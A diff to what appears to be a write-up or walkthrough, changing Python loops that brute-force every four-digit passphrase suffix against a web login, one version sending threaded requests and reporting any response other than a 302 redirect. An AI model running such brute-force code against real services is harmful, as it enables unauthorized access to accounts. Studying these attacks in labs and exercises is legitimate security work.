@@ -100,7 +100,7 @@ Running the python above returns the exact same as the network request - a `302`
 I could write a quick wrapper to the request such that it would try all combinations 0000 to 9999.
 
 ```python
-for i in range(1000,9000):
+for i in range(10000):
 	padding = "0" * (4 - len(str(i)))
 	attempt = padding + str(i)
 	data = {
@@ -131,7 +131,7 @@ def brute_force_pass(attempt):
 	if response.status_code != 302:
 		print('Valid passphrase found: GLOBAL%s' % attempt)
 
-for i in range(1000,9000):
+for i in range(10000):
 	padding = "0" * (4 - len(str(i)))
 	attempt = padding + str(i)
 	threading.Thread(target=brute_force_pass, args=[attempt]).start()
